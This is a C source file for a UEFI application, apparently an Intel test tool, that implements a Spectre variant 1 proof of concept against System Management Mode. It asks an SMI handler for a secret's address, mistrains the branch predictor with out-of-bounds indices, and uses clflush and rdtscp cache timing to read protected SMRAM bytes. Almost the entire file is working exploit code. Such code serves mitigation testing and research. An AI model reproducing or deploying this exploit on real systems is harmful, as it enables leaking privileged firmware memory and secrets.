/** @file

Copyright (c) 2016, Intel Corporation. All rights reserved.<BR>
This program and the accompanying materials
are licensed and made available under the terms and conditions of the BSD License
which accompanies this distribution.  The full text of the license may be found at
http://opensource.org/licenses/bsd-license.php

THE PROGRAM IS DISTRIBUTED UNDER THE BSD LICENSE ON AN "AS IS" BASIS,
WITHOUT WARRANTIES OR REPRESENTATIONS OF ANY KIND, EITHER EXPRESS OR IMPLIED.

**/

#include <Uefi.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/DebugLib.h>
#include <Library/UefiLib.h>
#include <Protocol/SmmCommunication.h>
#include <Guid/PiSmmCommunicationRegionTable.h>

#include "Variant1SmmCommBuffer.h"

EFI_SMM_COMMUNICATION_PROTOCOL     *mSmmCommunication        = NULL;

UINT8                              *mCommBuffer;
VARIANT1_SMM_COMM_BUFFER           *mVariant1CommBuffer;
UINT8 TempArray1[160] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
EFI_GUID mSmmCommGuid = VARIANT1_SMM_COMM_GUID;

/**
  Initialize the communicate buffer using DataSize and Function number.

  @param[out]      CommunicateBuffer The communicate buffer. Caller should free it after use.
  @param[out]      DataPtr           Points to the data in the communicate buffer. Caller should not free it.
  @param[in]       DataSize          The payload size.
  @param[in]       Function          The function number used to initialize the communicate header.

**/
VOID
InitCommunicateBuffer (
  OUT     VOID                              **CommunicateBuffer,
  OUT     VOID                              **DataPtr,
  IN      UINTN                             DataSize,
  IN      UINTN                             Function
  )
{
  EFI_SMM_COMMUNICATE_HEADER                *SmmCommunicateHeader;  
  SMM_VARIANT1_COMMUNICATE_FUNCTION_HEADER  *Variant1Header; 

  //
  // The whole buffer size: SMM_COMMUNICATE_HEADER_SIZE + sizeof(SMM_VARIANT1_COMMUNICATE_FUNCTION_HEADER) + DataSize.
  //
  SmmCommunicateHeader = (VOID *)mCommBuffer;
  ASSERT (SmmCommunicateHeader != NULL);
   
  //
  // Prepare data buffer.
  //
  CopyGuid (&SmmCommunicateHeader->HeaderGuid, &mSmmCommGuid);
  SmmCommunicateHeader->MessageLength = DataSize + sizeof(SMM_VARIANT1_COMMUNICATE_FUNCTION_HEADER);
 
  Variant1Header = (SMM_VARIANT1_COMMUNICATE_FUNCTION_HEADER *) SmmCommunicateHeader->Data;
  Variant1Header->Function = Function;
  Variant1Header->ReturnStatus = EFI_NOT_READY;

  *CommunicateBuffer = SmmCommunicateHeader;
}


/**
  Send the data in communicate buffer to SMI handler and get response.

  @param[in, out]  SmmCommunicateHeader    The communicate buffer.
  @param[in]       DataSize                The payload size.
                      
**/
EFI_STATUS
SendCommunicateBuffer (
  IN OUT  EFI_SMM_COMMUNICATE_HEADER        *SmmCommunicateHeader,
  IN      UINTN                             DataSize
  )
{
  EFI_STATUS                                Status;
  UINTN                                     CommSize;
  SMM_VARIANT1_COMMUNICATE_FUNCTION_HEADER  *Variant1Header; 
 
  CommSize = SMM_COMMUNICATE_HEADER_SIZE + sizeof(SMM_VARIANT1_COMMUNICATE_FUNCTION_HEADER);
  Status = mSmmCommunication->Communicate (mSmmCommunication, SmmCommunicateHeader, &CommSize);
  ASSERT_EFI_ERROR (Status);

  Variant1Header = (SMM_VARIANT1_COMMUNICATE_FUNCTION_HEADER *) SmmCommunicateHeader->Data;
  return  Variant1Header->ReturnStatus;
}


void victim_function(UINTN x) {
  SMM_VARIANT1_COMMUNICATE_FUNCTION_HEADER  *Variant1Header;

  Variant1Header = (SMM_VARIANT1_COMMUNICATE_FUNCTION_HEADER *) ((EFI_SMM_COMMUNICATE_HEADER *)mCommBuffer)->Data;
  Variant1Header->Offset   = x;
  SendCommunicateBuffer ((VOID *)mCommBuffer, 0);
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(UINTN malicious_x, UINT8 value[2], INTN score[2]) {
  INTN results[256];
  INTN tries, i, j, k, mix_i, junk = 0;
  UINTN training_x, x;
  UINT64 time1, time2;
  volatile UINT8 * addr;

  ZeroMem (results, sizeof(results));

  for (tries = 99; tries > 0; tries--) {

    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush( & mVariant1CommBuffer->array2[i * 512]); /* intrinsic for clflush instruction */

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % mVariant1CommBuffer->array1_size;
    for (j = 29; j >= 0; j--) {
      _mm_clflush( & mVariant1CommBuffer->array1_size);
      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      victim_function(x);
    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = & mVariant1CommBuffer->array2[mix_i * 512];
      time1 = __rdtscp( & junk); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != mVariant1CommBuffer->array1[tries % mVariant1CommBuffer->array1_size])
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk; /* use junk so code above won't get optimized out*/
  value[0] = (UINT8) j;
  score[0] = results[j];
  value[1] = (UINT8) k;
  score[1] = results[k];
}

EFI_STATUS
EFIAPI
DoSmmTest (
  VOID
  )
{
  EFI_STATUS                                Status;
  EFI_SMM_COMMUNICATE_HEADER                *SmmCommunicateHeader;
  SMM_VARIANT1_COMMUNICATE_FUNCTION_HEADER  *Variant1Header;
  UINT64                                    SecretAddress;
  UINTN                                     malicious_x;
  INTN score[2], len = 6;
  UINT8 value[2];

  InitCommunicateBuffer ((VOID **)&SmmCommunicateHeader, NULL, 0, FUNCTION_GET_SECRET_ADDRESS);
  Variant1Header = (SMM_VARIANT1_COMMUNICATE_FUNCTION_HEADER *) SmmCommunicateHeader->Data;

  Status = SendCommunicateBuffer (SmmCommunicateHeader, 0);
  SecretAddress = Variant1Header->Address;

  malicious_x = (UINTN)SecretAddress - (UINTN)&mVariant1CommBuffer->array1[0];

  Variant1Header->Function = FUNCTION_COMMUNICATION;
  Variant1Header->Address  = (UINTN)mVariant1CommBuffer;

  Print (L"Reading %d bytes:\n", len);
  while (--len >= 0) {
    Print (L"Reading at malicious_x = %p... ", (void * ) malicious_x);
    readMemoryByte(malicious_x++, value, score);
    Print (L"%s: ", (score[0] >= 2 * score[1] ? L"Success" : L"Unclear"));
    Print (L"0x%02X='%c' score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      Print (L"(second best: 0x%02X score=%d)", value[1], score[1]);
    Print (L"\n");
  }

  return EFI_SUCCESS;
}



EFI_STATUS
EFIAPI
Variant1SmmAppEntrypoint (
  IN EFI_HANDLE         ImageHandle,
  IN EFI_SYSTEM_TABLE   *SystemTable
  )
{
  EFI_STATUS                                          Status;
  EDKII_PI_SMM_COMMUNICATION_REGION_TABLE             *PiSmmCommunicationRegionTable;
  UINT32                                              Index;
  EFI_MEMORY_DESCRIPTOR                               *Entry;
  UINTN                                               Size;

  Status = gBS->LocateProtocol(&gEfiSmmCommunicationProtocolGuid, NULL, (VOID **)&mSmmCommunication);
  if (EFI_ERROR(Status)) {
    Print(L"SmiHandlerProfile: Locate SmmCommunication protocol - %r\n", Status);
    return EFI_SUCCESS;
  }

  Status = EfiGetSystemConfigurationTable(
             &gEdkiiPiSmmCommunicationRegionTableGuid,
             (VOID **)&PiSmmCommunicationRegionTable
             );
  if (EFI_ERROR(Status)) {
    Print(L"Get PiSmmCommunicationRegionTable - %r\n", Status);
    return EFI_SUCCESS;
  }
  Entry = (EFI_MEMORY_DESCRIPTOR *)(PiSmmCommunicationRegionTable + 1);
  Size = 0;
  for (Index = 0; Index < PiSmmCommunicationRegionTable->NumberOfEntries; Index++) {
    if (Entry->Type == EfiConventionalMemory) {
      Size = EFI_PAGES_TO_SIZE((UINTN)Entry->NumberOfPages);
      if (Size >= SMM_COMMUNICATE_HEADER_SIZE + sizeof(SMM_VARIANT1_COMMUNICATE_FUNCTION_HEADER) + sizeof(VARIANT1_SMM_COMM_BUFFER)) {
        break;
      }
    }
    Entry = (EFI_MEMORY_DESCRIPTOR *)((UINT8 *)Entry + PiSmmCommunicationRegionTable->DescriptorSize);
  }
  ASSERT(Index < PiSmmCommunicationRegionTable->NumberOfEntries);

  mCommBuffer = (UINT8 *)(UINTN)Entry->PhysicalStart;

  mVariant1CommBuffer = (VOID *)((UINT8 *)mCommBuffer + SMM_COMMUNICATE_HEADER_SIZE + sizeof(SMM_VARIANT1_COMMUNICATE_FUNCTION_HEADER));
  mVariant1CommBuffer->array1_size = 16;
  CopyMem (mVariant1CommBuffer->array1, TempArray1, sizeof(mVariant1CommBuffer->array1));
  SetMem (mVariant1CommBuffer->array2, sizeof(mVariant1CommBuffer->array2), 1);

  DoSmmTest ();

  return EFI_SUCCESS;
}
